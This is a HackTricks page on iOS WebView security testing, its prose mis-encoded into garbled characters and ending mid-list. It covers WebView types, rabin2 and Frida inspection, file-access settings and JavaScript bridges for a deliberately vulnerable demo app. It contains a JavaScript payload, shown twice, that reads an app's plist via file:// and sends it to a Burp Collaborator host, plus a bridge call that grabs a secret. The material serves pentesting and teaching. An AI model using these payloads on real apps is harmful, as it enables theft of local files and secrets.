# iOS WebViews

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## WebViewsç±»å‹

WebViewsæ˜¯åº”ç”¨å†…æµè§ˆå™¨ç»„ä»¶ï¼Œç”¨äºæ˜¾ç¤ºäº¤äº’å¼**ç½‘ç»œ** **å†…å®¹**ã€‚å®ƒä»¬å¯ä»¥ç”¨æ¥ç›´æ¥å°†ç½‘ç»œå†…å®¹åµŒå…¥åˆ°åº”ç”¨çš„ç”¨æˆ·ç•Œé¢ä¸­ã€‚iOS WebViews **é»˜è®¤æ”¯æŒ** **JavaScript** æ‰§è¡Œï¼Œå› æ­¤è„šæœ¬æ³¨å…¥å’Œè·¨ç«™è„šæœ¬æ”»å‡»å¯èƒ½ä¼šå½±å“å®ƒä»¬ã€‚

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** ä»iOS 12å¼€å§‹UIWebViewå·²è¢«å¼ƒç”¨ï¼Œä¸åº”å†ä½¿ç”¨ã€‚**JavaScriptæ— æ³•è¢«ç¦ç”¨**ã€‚
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): è¿™æ˜¯æ‰©å±•åº”ç”¨åŠŸèƒ½ã€æ§åˆ¶æ˜¾ç¤ºå†…å®¹çš„åˆé€‚é€‰æ‹©ã€‚
* **JavaScript** é»˜è®¤å¯ç”¨ï¼Œä½†æ˜¯é€šè¿‡ `WKWebView` çš„ **`javaScriptEnabled`** å±æ€§ï¼Œå®ƒ**å¯ä»¥è¢«å®Œå…¨ç¦ç”¨**ï¼Œé˜²æ­¢æ‰€æœ‰è„šæœ¬æ³¨å…¥æ¼æ´ã€‚
* **`JavaScriptCanOpenWindowsAutomatically`** å¯ç”¨äº**é˜²æ­¢** JavaScript **æ‰“å¼€æ–°çª—å£**ï¼Œä¾‹å¦‚å¼¹å‡ºçª—å£ã€‚
* **`hasOnlySecureContent`** å±æ€§å¯ç”¨äºéªŒè¯WebViewåŠ è½½çš„èµ„æºæ˜¯å¦é€šè¿‡åŠ å¯†è¿æ¥æ£€ç´¢ã€‚
* `WKWebView` å®ç°äº†è¿›ç¨‹å¤–æ¸²æŸ“ï¼Œå› æ­¤**å†…å­˜æŸåæ¼æ´ä¸ä¼šå½±å“**ä¸»åº”ç”¨è¿›ç¨‹ã€‚
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** åº”å½“ç”¨äºæä¾›**é€šç”¨çš„ç½‘ç»œæµè§ˆä½“éªŒ**ã€‚è¿™äº›WebViewså¯ä»¥å¾ˆå®¹æ˜“åœ°è¢«è¯†åˆ«ï¼Œå› ä¸ºå®ƒä»¬æœ‰ä¸€ä¸ªç‰¹å¾æ€§çš„å¸ƒå±€ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å…ƒç´ ï¼š

* ä¸€ä¸ªåªè¯»çš„åœ°å€æ ï¼Œå¸¦æœ‰å®‰å…¨æŒ‡ç¤ºå™¨ã€‚
* ä¸€ä¸ªåŠ¨ä½œï¼ˆ"**åˆ†äº«**"ï¼‰**æŒ‰é’®**ã€‚
* ä¸€ä¸ª**å®ŒæˆæŒ‰é’®**ï¼Œåé€€å’Œå‰è¿›å¯¼èˆªæŒ‰é’®ï¼Œä»¥åŠä¸€ä¸ª"æ‰“å¼€Safari"æŒ‰é’®ä»¥ç›´æ¥åœ¨Safariä¸­æ‰“å¼€é¡µé¢ã€‚

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* åœ¨ `SFSafariViewController` ä¸­**æ— æ³•ç¦ç”¨JavaScript**ï¼Œè¿™æ˜¯æ¨èä½¿ç”¨ `WKWebView` çš„åŸå› ä¹‹ä¸€ï¼Œå½“ç›®æ ‡æ˜¯æ‰©å±•åº”ç”¨çš„ç”¨æˆ·ç•Œé¢æ—¶ã€‚
* `SFSafariViewController` ä¹Ÿ**å…±äº«cookies**å’Œå…¶ä»–ç½‘ç«™æ•°æ®ä¸**Safari**ã€‚
* ç”¨æˆ·ä¸ `SFSafariViewController` çš„æ´»åŠ¨å’Œäº’åŠ¨**å¯¹åº”ç”¨ä¸å¯è§**ï¼Œåº”ç”¨æ— æ³•è®¿é—®è‡ªåŠ¨å¡«å……æ•°æ®ã€æµè§ˆå†å²æˆ–ç½‘ç«™æ•°æ®ã€‚
* æ ¹æ®App Storeå®¡æŸ¥æŒ‡å—ï¼Œ`SFSafariViewController`**ä¸å¾—è¢«å…¶ä»–è§†å›¾æˆ–å±‚éšè—æˆ–é®æŒ¡**ã€‚

## å‘ç°WebViewsé…ç½®

### é™æ€åˆ†æ

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
```markdown
æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥æœç´¢è¿™äº› WebView ç±»çš„å·²çŸ¥æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œæœç´¢ç”¨äºåˆå§‹åŒ– WKWebView çš„æ–¹æ³•ï¼ˆ[`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)ï¼‰ï¼š
```
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### æµ‹è¯•JavaScripté…ç½®

å¯¹äº`WKWebView`ï¼Œä½œä¸ºæœ€ä½³å®è·µï¼Œé™¤éæ˜ç¡®éœ€è¦ï¼Œå¦åˆ™åº”ç¦ç”¨JavaScriptã€‚è¦éªŒè¯JavaScriptæ˜¯å¦å·²æ­£ç¡®ç¦ç”¨ï¼Œè¯·æœç´¢é¡¹ç›®ä¸­çš„`WKPreferences`ç”¨æ³•ï¼Œå¹¶ç¡®ä¿[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)å±æ€§è®¾ç½®ä¸º`false`ï¼š
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
å¦‚æœæ‚¨åªæœ‰ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æœç´¢è¿™ä¸ªï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### æµ‹è¯• OnlySecureContent

ä¸ `UIWebView` ç›¸æ¯”ï¼Œä½¿ç”¨ `WKWebView` æ—¶å¯ä»¥æ£€æµ‹åˆ°[æ··åˆå†…å®¹](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)ï¼ˆä» HTTPS é¡µé¢åŠ è½½çš„ HTTP å†…å®¹ï¼‰ã€‚é€šè¿‡ä½¿ç”¨æ–¹æ³• [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)ï¼Œå¯ä»¥éªŒè¯é¡µé¢ä¸Šçš„æ‰€æœ‰èµ„æºæ˜¯å¦éƒ½é€šè¿‡å®‰å…¨åŠ å¯†è¿æ¥åŠ è½½ã€‚\
åœ¨ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
æ‚¨è¿˜å¯ä»¥åœ¨æºä»£ç æˆ–å­—ç¬¦ä¸²ä¸­æœç´¢å­—ç¬¦ä¸² "http://"ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸ä¸€å®šæ„å‘³ç€å­˜åœ¨æ··åˆå†…å®¹é—®é¢˜ã€‚åœ¨ [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content) ä¸­äº†è§£æ›´å¤šå…³äºæ··åˆå†…å®¹çš„ä¿¡æ¯ã€‚

### åŠ¨æ€åˆ†æ

å¯ä»¥é€šè¿‡ `ObjC.choose()` æ£€æŸ¥å †ï¼Œä»¥æ‰¾åˆ°ä¸åŒç±»å‹çš„ WebViews çš„å®ä¾‹ï¼Œå¹¶ä¸”è¿˜å¯ä»¥æœç´¢å±æ€§ `javaScriptEnabled` å’Œ `hasonlysecurecontent`ï¼š

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
åŠ è½½å®ƒï¼š
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView åè®®å¤„ç†

åœ¨ iOS ä¸Šçš„ WebView ä¸­ï¼Œæœ‰å‡ ä¸ªé»˜è®¤çš„æ–¹æ¡ˆå¯ç”¨ï¼Œä¾‹å¦‚ï¼š

* http(s)://
* file://
* tel://

WebViews å¯ä»¥ä»ç«¯ç‚¹åŠ è½½è¿œç¨‹å†…å®¹ï¼Œä½†å®ƒä»¬ä¹Ÿå¯ä»¥ä»åº”ç”¨æ•°æ®ç›®å½•åŠ è½½æœ¬åœ°å†…å®¹ã€‚å¦‚æœåŠ è½½äº†æœ¬åœ°å†…å®¹ï¼Œç”¨æˆ·ä¸åº”è¯¥èƒ½å¤Ÿå½±å“ç”¨äºåŠ è½½æ–‡ä»¶çš„æ–‡ä»¶åæˆ–è·¯å¾„ï¼Œç”¨æˆ·ä¹Ÿä¸åº”è¯¥èƒ½å¤Ÿç¼–è¾‘å·²åŠ è½½çš„æ–‡ä»¶ã€‚

### WebView å†…å®¹åŠ è½½

* **UIWebView**ï¼šå®ƒå¯ä»¥ä½¿ç”¨å·²å¼ƒç”¨çš„æ–¹æ³• [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) æˆ– [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) æ¥åŠ è½½å†…å®¹ã€‚
* **WKWebView**ï¼šå®ƒå¯ä»¥ä½¿ç”¨æ–¹æ³• [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) æˆ– [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) æ¥åŠ è½½æœ¬åœ° HTML æ–‡ä»¶ï¼Œä»¥åŠ `loadRequest:` æ¥åŠ è½½ç½‘é¡µå†…å®¹ã€‚é€šå¸¸ï¼Œæœ¬åœ°æ–‡ä»¶ä¸åŒ…æ‹¬ [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)ã€[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) æˆ– [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init) ç­‰æ–¹æ³•ç»“åˆä½¿ç”¨ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜åº”è¯¥éªŒè¯åº”ç”¨æ˜¯å¦ä½¿ç”¨äº†æ–¹æ³• [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc)ã€‚å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ `URL`ï¼ŒåŒ…å«è¦åœ¨ WebView ä¸­åŠ è½½çš„ URLï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•° `allowingReadAccessToURL` å¯èƒ½åŒ…å«å•ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚å¦‚æœåŒ…å«å•ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†å¯ä¾› WebView ä½¿ç”¨ã€‚ç„¶è€Œï¼Œå¦‚æœå®ƒåŒ…å«ä¸€ä¸ªç›®å½•ï¼Œ**è¯¥ç›®å½•ä¸Šçš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†å¯ä¾› WebView ä½¿ç”¨**ã€‚å› æ­¤ï¼Œå€¼å¾—æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œå¦‚æœæ˜¯ç›®å½•ï¼ŒéªŒè¯å…¶ä¸­æ˜¯å¦æ²¡æœ‰æ•æ„Ÿæ•°æ®ã€‚

å¦‚æœæ‚¨æœ‰æºä»£ç ï¼Œæ‚¨å¯ä»¥æœç´¢è¿™äº›æ–¹æ³•ã€‚æ‹¥æœ‰**ç¼–è¯‘åçš„** **äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œæ‚¨ä¹Ÿå¯ä»¥æœç´¢è¿™äº›æ–¹æ³•ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### æ–‡ä»¶è®¿é—®

* **UIWebViewï¼š**
* `file://` æ–¹æ¡ˆå§‹ç»ˆå¯ç”¨ã€‚
* ä» `file://` URLs çš„æ–‡ä»¶è®¿é—®å§‹ç»ˆè¢«å¯ç”¨ã€‚
* ä» `file://` URLs çš„é€šç”¨è®¿é—®å§‹ç»ˆè¢«å¯ç”¨ã€‚
* å¦‚æœä½ ä»è®¾ç½®äº† `baseURL` ä¸º `nil` çš„ `UIWebView` ä¸­æ£€ç´¢æœ‰æ•ˆæºï¼Œä½ ä¼šå‘ç°å®ƒ**ä¸æ˜¯è®¾ç½®ä¸º "null"**ï¼Œç›¸åï¼Œä½ ä¼šå¾—åˆ°ç±»ä¼¼ä»¥ä¸‹çš„å†…å®¹ï¼š`applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`ã€‚è¿™ä¸ªæº "applewebdata://" ç±»ä¼¼äº "file://" æºï¼Œå› ä¸ºå®ƒ**ä¸å®æ–½åŒæºç­–ç•¥**ï¼Œå…è®¸è®¿é—®æœ¬åœ°æ–‡ä»¶å’Œä»»ä½•ç½‘ç»œèµ„æºã€‚

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**ï¼š
* **`allowFileAccessFromFileURLs`**ï¼ˆ`WKPreferences`ï¼Œé»˜è®¤ä¸º`false`ï¼‰ï¼šå®ƒå…è®¸åœ¨`file://`æ–¹æ¡ˆURLçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„JavaScriptè®¿é—®æ¥è‡ªå…¶ä»–`file://`æ–¹æ¡ˆURLçš„å†…å®¹ã€‚
* **`allowUniversalAccessFromFileURLs`**ï¼ˆ`WKWebViewConfiguration`ï¼Œé»˜è®¤ä¸º`false`ï¼‰ï¼šå®ƒå…è®¸åœ¨`file://`æ–¹æ¡ˆURLçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„JavaScriptè®¿é—®æ¥è‡ªä»»ä½•æ¥æºçš„å†…å®¹ã€‚

æ‚¨å¯ä»¥åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç æˆ–ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢è¿™äº›å‡½æ•°ã€‚\
æ­¤å¤–ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹fridaè„šæœ¬æ¥æŸ¥æ‰¾æ­¤ä¿¡æ¯ï¼š
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### æ³„éœ²ä»»æ„æ–‡ä»¶
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## é€šè¿‡ WebViews æš´éœ²çš„åŸç”Ÿæ–¹æ³•

è‡ª iOS 7 èµ·ï¼Œè‹¹æœå¼•å…¥äº†å…è®¸ **WebView ä¸­çš„ JavaScript è¿è¡Œæ—¶ä¸åŸç”Ÿ** Swift æˆ– Objective-C å¯¹è±¡é€šä¿¡çš„ APIã€‚

åŸç”Ÿä»£ç å’Œ JavaScript é€šä¿¡æœ‰ä¸¤ç§åŸºæœ¬æ–¹å¼ï¼š

* **JSContext**ï¼šå½“ Objective-C æˆ– Swift å—è¢«èµ‹å€¼ç»™ `JSContext` ä¸­çš„ä¸€ä¸ªæ ‡è¯†ç¬¦æ—¶ï¼ŒJavaScriptCore ä¼šè‡ªåŠ¨å°†è¯¥å—åŒ…è£…åœ¨ä¸€ä¸ª JavaScript å‡½æ•°ä¸­ã€‚
* **JSExport åè®®**ï¼šåœ¨ `JSExport` ç»§æ‰¿åè®®ä¸­å£°æ˜çš„å±æ€§ã€å®ä¾‹æ–¹æ³•å’Œç±»æ–¹æ³•è¢«æ˜ å°„åˆ° JavaScript å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å¯¹æ‰€æœ‰ JavaScript ä»£ç éƒ½æ˜¯å¯ç”¨çš„ã€‚åœ¨ JavaScript ç¯å¢ƒä¸­å¯¹å¯¹è±¡çš„ä¿®æ”¹ä¼šåæ˜ åœ¨åŸç”Ÿç¯å¢ƒä¸­ã€‚

æ³¨æ„ **åªæœ‰åœ¨ `JSExport` åè®®ä¸­å®šä¹‰çš„ç±»æˆå‘˜** æ‰èƒ½è¢« JavaScript ä»£ç è®¿é—®ã€‚\
æ³¨æ„æ£€æŸ¥å°†åŸç”Ÿå¯¹è±¡æ˜ å°„åˆ°ä¸ WebView å…³è”çš„ `JSContext` çš„ä»£ç ï¼Œå¹¶åˆ†æå®ƒæš´éœ²äº†å“ªäº›åŠŸèƒ½ï¼Œä¾‹å¦‚ä¸åº”è¯¥è®¿é—®å’Œæš´éœ²ç»™ WebViews çš„æ•æ„Ÿæ•°æ®ã€‚\
åœ¨ Objective-C ä¸­ï¼Œä¸ `UIWebView` å…³è”çš„ `JSContext` å¯ä»¥å¦‚ä¸‹è·å–ï¼š
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
```markdown
JavaScript ä»£ç åœ¨ **`WKWebView` ä¸­ä»ç„¶å¯ä»¥å‘é€æ¶ˆæ¯å›åŸç”Ÿåº”ç”¨ï¼Œä½†ä¸ `UIWebView` ä¸åŒçš„æ˜¯ï¼Œä¸èƒ½ç›´æ¥å¼•ç”¨ `WKWebView` çš„ `JSContext`**ã€‚ç›¸åï¼Œé€šä¿¡æ˜¯é€šè¿‡ä½¿ç”¨æ¶ˆæ¯ç³»ç»Ÿå’Œ `postMessage` å‡½æ•°æ¥å®ç°çš„ï¼Œè¯¥å‡½æ•°ä¼šè‡ªåŠ¨å°† JavaScript å¯¹è±¡åºåˆ—åŒ–ä¸ºåŸç”Ÿ Objective-C æˆ– Swift å¯¹è±¡ã€‚æ¶ˆæ¯å¤„ç†ç¨‹åºæ˜¯ä½¿ç”¨æ–¹æ³• [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) é…ç½®çš„ã€‚

### å¯ç”¨ JavascriptBridge
```
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### å‘é€æ¶ˆæ¯

æ·»åŠ ä¸€ä¸ªåä¸º `"name"`ï¼ˆæˆ–åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ä¸º `"javaScriptBridge"`ï¼‰çš„è„šæœ¬æ¶ˆæ¯å¤„ç†å™¨ä¼šå¯¼è‡´ JavaScript å‡½æ•° `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` åœ¨ä½¿ç”¨ç”¨æˆ·å†…å®¹æ§åˆ¶å™¨çš„æ‰€æœ‰ web è§†å›¾ä¸­çš„æ‰€æœ‰æ¡†æ¶ä¸­è¢«å®šä¹‰ã€‚ç„¶åå¯ä»¥[åƒè¿™æ ·ä» HTML æ–‡ä»¶ä¸­ä½¿ç”¨](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)ï¼š
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
```markdown
ä¸€æ—¦æ‰§è¡Œäº† Native å‡½æ•°ï¼Œå®ƒé€šå¸¸ä¼š**åœ¨ç½‘é¡µå†…æ‰§è¡Œä¸€äº› JavaScript**ï¼ˆè§ä¸‹é¢çš„ `evaluateJavascript`ï¼‰ï¼Œä½ å¯èƒ½å¯¹**è¦†ç›–å°†è¦æ‰§è¡Œçš„å‡½æ•°**ä»¥**çªƒå–ç»“æœ**æ„Ÿå…´è¶£ã€‚
ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„è„šæœ¬ä¸­ï¼Œå‡½æ•° **`javascriptBridgeCallBack`** å°†ä¼šè¢«æ‰§è¡Œï¼Œå¹¶å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼ˆè¢«è°ƒç”¨çš„å‡½æ•°å’Œ**ç»“æœ**ï¼‰ã€‚å¦‚æœä½ æ§åˆ¶äº†å°†è¦åŠ è½½çš„ HTMLï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª**æ˜¾ç¤ºç»“æœçš„è­¦å‘Š**ï¼Œå¦‚ï¼š
```
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### è¢«è°ƒç”¨å‡½æ•°

è¢«è°ƒç”¨å‡½æ•°ä½äº [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)ï¼š
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### æµ‹è¯•

ä¸ºäº†åœ¨åº”ç”¨ç¨‹åºå†…å‘é€ postMessageï¼Œæ‚¨å¯ä»¥ï¼š

* æ›´æ”¹æœåŠ¡å™¨å“åº”ï¼ˆMitMï¼‰
